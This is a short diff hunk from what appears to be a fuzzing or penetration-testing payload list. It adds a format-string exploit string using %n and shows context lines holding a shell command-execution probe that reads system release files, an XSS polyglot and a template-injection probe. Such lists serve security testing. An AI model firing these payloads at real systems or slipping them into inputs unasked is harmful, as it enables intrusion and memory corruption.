@@ -677,3 +677,4 @@ system("id;uname -a;cat /etc/*release*");
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 %s(un='%s')=%u
 7*7
+"AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n"
